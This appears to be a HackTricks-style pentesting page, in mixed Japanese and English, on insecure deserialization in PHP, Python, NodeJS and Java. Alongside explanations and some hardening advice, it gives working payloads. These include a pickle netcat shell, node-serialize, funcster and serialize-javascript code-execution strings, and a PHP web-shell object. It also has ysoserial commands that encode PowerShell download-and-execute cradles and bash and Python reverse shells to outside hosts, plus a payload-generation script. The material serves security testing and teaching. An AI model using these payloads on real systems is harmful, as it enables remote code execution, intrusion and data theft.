# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**Serialization** は、オブジェクトを保存可能な形式に変換する手法であり、オブジェクトを保存したり通信の一部として送信したりする目的で用いられます。この技術は、オブジェクトの構造や状態を維持したまま後で再作成できるようにするために一般的に使われます。

**Deserialization** は逆に、serialization を打ち消すプロセスです。特定の形式で構造化されたデータを受け取り、オブジェクトに再構築することを指します。

Deserialization は危険になり得ます。なぜなら、**攻撃者がserialized dataを操作して悪意のあるコードを実行させる**、またはオブジェクト再構築の過程でアプリケーションに予期しない動作を引き起こす可能性があるからです。

## PHP

In PHP, specific magic methods are utilized during the serialization and deserialization processes:

- `__sleep`: オブジェクトがserializedされるときに呼び出されます。このメソッドは、serializedされるべきオブジェクトのすべてのプロパティ名の配列を返すべきです。保留中のデータを確定したり、同様のクリーンアップタスクを実行するために一般的に使用されます。
- `__wakeup`: オブジェクトがdeserializedされるときに呼び出されます。serializedの過程で失われた可能性のあるデータベース接続を再確立したり、その他の再初期化処理を行うために使用されます。
- `__unserialize`: オブジェクトがdeserializedされる際、（存在する場合）`__wakeup` の代わりにこのメソッドが呼ばれます。`__wakeup` と比べて deserialization プロセスをより細かく制御できます。
- `__destruct`: オブジェクトが破棄される直前、またはスクリプト終了時にこのメソッドが呼ばれます。ファイルハンドルやデータベース接続を閉じるといったクリーンアップタスクに通常使用されます。
- `__toString`: オブジェクトを文字列として扱えるようにするメソッドです。内部の関数呼び出しに基づいてファイルを読み取るなどの処理に使われ、オブジェクトのテキスト表現を提供します。
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
If you look to the results you can see that the functions **`__wakeup`** and **`__destruct`** are called when the object is deserialized. Note that in several tutorials you will find that the **`__toString`** function is called when trying yo print some attribute, but apparently that's **not happening anymore**.

> [!WARNING]
> The method **`__unserialize(array $data)`** is called **instead of `__wakeup()`** if it is implemented in the class. It allows you to unserialize the object by providing the serialized data as an array. You can use this method to unserialize properties and perform any necessary tasks upon deserialization.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

結果を見ると、オブジェクトがデシリアライズされるときに関数 **`__wakeup`** と **`__destruct`** が呼ばれているのが分かります。いくつかのチュートリアルでは属性を出力しようとしたときに **`__toString`** が呼ばれるとありますが、どうやらそれは **もう起こらない** ようです。

詳しい **PHP の例** はこちら: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), こちら [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) またはこちら [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP デシリアライズ + Autoload Classes

PHP の autoload 機能を悪用して任意の PHP ファイルを読み込むなどが可能です:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### 参照された値のシリアライズ

何らかの理由で値を **別の値への参照としてシリアライズ** したい場合は、次のようにできます:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### `allowed_classes` を使った PHP Object Injection の防止

> [!INFO]
> `unserialize()` の **第2引数** (`$options` 配列) のサポートは **PHP 7.0** で追加されました。古いバージョンでは関数はシリアライズされた文字列のみを受け取り、どのクラスがインスタンス化されるかを制限することができません。

`unserialize()` は、特に指示されない限り、シリアライズされたストリーム内で見つけた **すべてのクラス** をインスタンス化します。PHP 7 以降、この挙動は [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) オプションで制限できます:
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
**`allowed_classes` が省略されている _または_ コードが PHP < 7.0 で実行されている場合**、その呼び出しは **危険** になります。攻撃者は `__wakeup()` や `__destruct()` といったマジックメソッドを悪用するペイロードを作成して Remote Code Execution (RCE) を達成できます。

#### 実際の例: Everest Forms (WordPress) CVE-2025-52709

WordPress プラグイン **Everest Forms ≤ 3.2.2** はヘルパーラッパーで防御しようとしましたが、レガシーな PHP バージョンを考慮していませんでした:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
依然として **PHP ≤ 7.0** を実行しているサーバでは、この2番目の分岐により、管理者が悪意のあるフォーム送信を開いたときに古典的な **PHP Object Injection** が発生しました。最小の exploit payload は次のようになります:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
管理者がエントリを閲覧した瞬間、オブジェクトがインスタンス化され、`SomeClass::__destruct()` が実行され、arbitrary code execution が発生した。

**まとめ**
1. `unserialize()` を呼ぶ際は常に `['allowed_classes' => false]`（または厳格なホワイトリスト）を渡すこと。
2. 防御用のラッパーを監査する — 旧来の PHP ブランチを見落としがちである。
3. 単に **PHP ≥ 7.x** にアップグレードするだけでは *不十分*：そのオプションは明示的に渡す必要がある。

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) は PHP の deserializations を悪用するペイロードを生成するのに役立つ。\
ただし、多くの場合アプリケーションのソースコード内で deserialization を悪用する方法を**見つけられない**が、外部の PHP extensions のコードを**悪用できる**場合がある。\
可能ならサーバの `phpinfo()` を確認し、**インターネットで検索**（さらに **PHPGGC** の **gadgets** でも）して、悪用できそうな gadget を探す。 

### phar:// メタデータ deserialization

もし LFI を見つけ、その LFI がファイル内の php コードを実行せず単に読み込んでいる場合、たとえば _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_ のような関数を使っているケースでは、**phar** プロトコルを使ってファイルを**読み込む**際に発生する deserialization を悪用できる可能性がある。\
詳細は以下の投稿を参照：

{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

オブジェクトが unpickle されると、関数 `__reduce__` が実行される。\
悪用されると、サーバはエラーを返すことがある。
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.

バイパス手法を確認する前に、python3 を実行している場合は、python2 と互換性のあるオブジェクトを生成するために `print(base64.b64encode(pickle.dumps(P(),2)))` を使用してみてください。

For more information about escaping from **pickle jails** check:

**pickle jails** から脱出する方法の詳細は次を参照してください：

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

The following page present the technique to **abuse an unsafe deserialization in yamls** python libraries and finishes with a tool that can be used to generate RCE deserialization payload for **Pickle, PyYAML, jsonpickle and ruamel.yaml**:

次のページでは、Python の YAML ライブラリにおける unsafe deserialization を悪用する手法を解説し、**Pickle, PyYAML, jsonpickle and ruamel.yaml** 用の RCE デシリアライズペイロードを生成するツールで締めくくっています：

{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **doesn't have "magic" functions** like PHP or Python that are going to be executed just for creating an object. But it has some **functions** that are **frequently used even without directly calling them** such as **`toString`**, **`valueOf`**, **`toJSON`**.\
If abusing a deserialization you can **compromise these functions to execute other code** (potentially abusing prototype pollutions) you could execute arbitrary code when they are called.

JS は、オブジェクトを生成するだけで実行されるような PHP や Python のような **"magic" functions は持ちません**。しかし、**`toString`、`valueOf`、`toJSON`** のように、**直接呼び出さなくても頻繁に使用される関数**は存在します。デシリアライズの悪用によりこれらの関数を **他のコードを実行するように改変（compromise）** できれば（prototype pollutions を悪用する可能性があります）、それらが呼び出されたときに任意のコードを実行できます。

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _Follow_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _for more info._

別の、直接呼び出さずに関数を実行する **"magic" な方法** は、**async function が返すオブジェクトを改変（compromise）すること**です（promise）。返り値オブジェクトを別の **promise** に変換し、その中に関数型の **"then"** という **プロパティ** を持たせると、それが別の promise によって返されたというだけで **実行されます**。_詳細は_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _を参照してください._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

この手法について学びたい場合は **次のチュートリアルをご覧ください**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

このライブラリは関数をシリアライズできます。例:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**シリアライズされたオブジェクト**は次のようになります:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
You can see in the example that when a function is serialized the `_$$ND_FUNC$$_` flag is appended to the serialized object.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

As you may see in the last chunk of code, **if the flag is found** `eval` is used to deserialize the function, so basically **ユーザー入力が `eval` 関数内で使われている**.

However, **just serialising** a function **won't execute it** as it would be necessary that some part of the code is **calling `y.rce`** in our example and that's highly **ありそうにない**.\
Anyway, you could just **modify the serialised object** **adding some parenthesis** in order to auto execute the serialized function when the object is deserialized.\
In the next chunk of code **notice the last parenthesis** and how the `unserialize` function will automatically execute the code:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
前述の通り、このライブラリは `_$$ND_FUNC$$_` の後のコードを取得し、`eval` を使って**実行します**。したがって、**コードを自動実行**するには、関数作成部分と最後の括弧を削除し、以下の例のように**JS のワンライナーを実行するだけ**です:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
この脆弱性を悪用する方法についての情報は、[**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **further information** を参照してください。

### [funcster](https://www.npmjs.com/package/funcster)

注目すべき点は、**funcster** では **標準の組み込みオブジェクト** にアクセスできないことです。これらはアクセス可能なスコープの外にあり、そのため組み込みオブジェクトのメソッドを呼び出そうとするコードの実行が妨げられ、`console.log()` や `require(something)` のようなコマンドを使用した場合に `"ReferenceError: console is not defined"` のような例外が発生します。

この制限にもかかわらず、特定のアプローチによって全ての標準組み込みオブジェクトを含むグローバルコンテキストへの完全なアクセスを回復することが可能です。グローバルコンテキストを直接利用することでこの制限を回避できます。例えば、以下のスニペットを使ってアクセスを再確立できます：
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**詳しくは**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

この**serialize-javascript**パッケージはシリアライズ専用に設計されており、組み込みのデシリアライズ機能を持ちません。デシリアライズの方法はユーザー側で実装する必要があります。公式の例ではシリアライズされたデータをデシリアライズするために直接`eval`を使用することを示しています：
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
この関数がオブジェクトをdeserializeするために使用されている場合、**簡単に悪用できます**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**詳細は**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

In the following pages you can find information about how to abuse this library to execute arbitrary commands:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Javaでは、**deserialization callbacks are executed during the process of deserialization**。この実行は、悪意のあるペイロードを作成してこれらのコールバックをトリガーする攻撃者によって悪用され、悪意のある処理が実行される可能性があります。

### Fingerprints

#### White Box

コードベースで潜在的なserializationの脆弱性を特定するには、次を検索してください:

- `Serializable` インターフェースを実装しているクラス。
- `java.io.ObjectInputStream`、`readObject`、`readUnshare` 関数の使用。

特に注意する点:

- `XMLDecoder` が外部ユーザーによって定義されたパラメータとともに使用されている場合。
- `XStream` の `fromXML` メソッド、特に XStream のバージョンが1.46以下の場合は serialization の問題に脆弱な可能性があります。
- `ObjectInputStream` と `readObject` メソッドの組み合わせ。
- `readObject`、`readObjectNodData`、`readResolve`、または `readExternal` のようなメソッドの実装。
- `ObjectInputStream.readUnshared`。
- `Serializable` の一般的な使用。

#### Black Box

Black Box テストでは、java serialized objects（`ObjectInputStream` に由来）を示す特定の **signatures or "Magic Bytes"** を探します:

- 16進パターン: `AC ED 00 05`.
- Base64 パターン: `rO0`.
- HTTP レスポンスヘッダで `Content-type` が `application/x-java-serialized-object` に設定されているもの。
- 事前に圧縮されていたことを示す16進パターン: `1F 8B 08 00`.
- 事前に圧縮されていたことを示す Base64 パターン: `H4sIA`.
- `.faces` 拡張子の Web ファイルおよび `faces.ViewState` パラメータ。これらのパターンがウェブアプリケーションで見つかった場合は、[post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) で詳述されている通りの調査を行うべきです。
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### 脆弱かどうかを確認

もし **learn about how does a Java Deserialized exploit work** について学びたいなら、[**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md)、[**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md)、および[**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md) を参照してください。

#### SignedObject-gated deserialization and pre-auth reachability

最近のコードベースでは、`java.security.SignedObject` で deserialization をラップし、内部オブジェクトをデシリアライズする `getObject()` を呼ぶ前に署名を検証することがあります。これは任意のトップレベルの gadget classes を防ぎますが、攻撃者が有効な署名を入手できる（例: private-key compromise や signing oracle）場合は依然として悪用可能です。さらに、エラーハンドリングのフローが未認証ユーザー向けにセッション束縛トークンを発行し、通常は保護された sinks を pre-auth で露出させることがあります。

具体的なケーススタディ（リクエスト、IoCs、ハードニングのガイダンスを含む）については、次を参照してください：

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### ホワイトボックステスト

既知の脆弱性を持つアプリケーションがインストールされているかどうかを確認できます。
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **すべてのライブラリを確認する** known to be vulnerable and that [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
You could also use [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) to search for possible gadget chains that can be exploited.\
When running **gadgetinspector** (after building it) don't care about the tons of warnings/errors that it's going through and let it finish. It will write all the findings under _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Please, notice that **gadgetinspector won't create an exploit and it may indicate false positives**.

#### ブラックボックステスト

Using the Burp extension [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) you can identify **which libraries are available** (and even the versions). With this information it could be **easier to choose a payload** to exploit the vulnerability.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe is focused on **`ObjectInputStream` デシリアライズ**。

Using Burp extension [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) you can **identify vulnerable libraries** exploitable with ysoserial and **exploit** them.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner is focused on **`ObjectInputStream`** デシリアライズ。

You can also use [**Freddy**](https://github.com/nccgroup/freddy) to **detect deserializations** vulnerabilities in **Burp**. This plugin will detect **not only `ObjectInputStream`** related vulnerabilities but **also** vulns from **Json** an **Yml** deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**シリアライズテスト**

Not all is about checking if any vulnerable library is used by the server. Sometimes you could be able to **change the data inside the serialized object and bypass some checks** (maybe grant you admin privileges inside a webapp).\
If you find a java serialized object being sent to a web application, **you can use** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **to print in a more human readable format the serialization object that is sent**. Knowing which data are you sending would be easier to modify it and bypass some checks.

### **エクスプロイト**

#### **ysoserial**

The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
When creating a payload for **java.lang.Runtime.exec()** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$()" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`). In order to encode correctly the payload you could [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

Feel free to use the next script to create **all the possible code execution** payloads for Windows and Linux and then test them on the vulnerable web page:

java.lang.Runtime.exec() のペイロードを作成する際、実行結果のリダイレクトに ">" や "|"、コマンド実行に "$()"、あるいはコマンドに **引数を渡す**（**スペース** で区切られた）といった特殊文字は使用できません（`echo -n "hello world"` は可能ですが、`python2 -c 'print "Hello world"'` はできません）。ペイロードを正しくエンコードするには [このウェブページ](http://www.jackson-t.ca/runtime-exec-payloads.html) を参照してください。

以下のスクリプトを使って、Windows と Linux 向けの **all the possible code execution** ペイロードを生成し、脆弱なウェブページでテストしてください：
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

あなたは **使用する** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ことによって ysoserial と併用し、より多くの exploits を作成できます**。このツールに関する詳細は、ツールが発表された講演の **スライド** にあります: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)は、Java のさまざまな **Json** および **Yml** シリアライズライブラリを悪用するための payloads を生成するために使用できます。\
プロジェクトをコンパイルするために、`pom.xml` にこれらの **依存関係** を **追加** する必要がありました:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**maven をインストール**し、プロジェクトを**コンパイル**してください:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

このJava JSONライブラリの詳細はこちら: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### ラボ

- ysoserialのpayloadsをテストしたい場合、**このwebappを実行できます**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### なぜ

Javaは次のようなさまざまな目的でserializationを多用している:

- **HTTP requests**: Serializationはパラメータ、ViewState、cookiesなどの管理で広く利用されている。
- **RMI (Remote Method Invocation)**: Java RMIプロトコルは完全にserializationに依存しており、Javaアプリケーションのリモート通信の基盤となっている。
- **RMI over HTTP**: この方式はJavaベースのthick client webアプリケーションで一般的に使われ、すべてのオブジェクト通信にserializationを利用する。
- **JMX (Java Management Extensions)**: JMXはネットワーク経由でオブジェクトを送信する際にserializationを利用する。
- **Custom Protocols**: Javaでは、生のJavaオブジェクトを送受信するのが標準的な実装であり、これは今後のexploit例で示される。

### 予防

#### Transient objects

クラスが`Serializable`を実装している場合、シリアライズしたくない内部のオブジェクトを`transient`として指定できる。例えば:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serializable を実装する必要があるクラスのシリアライズを回避する

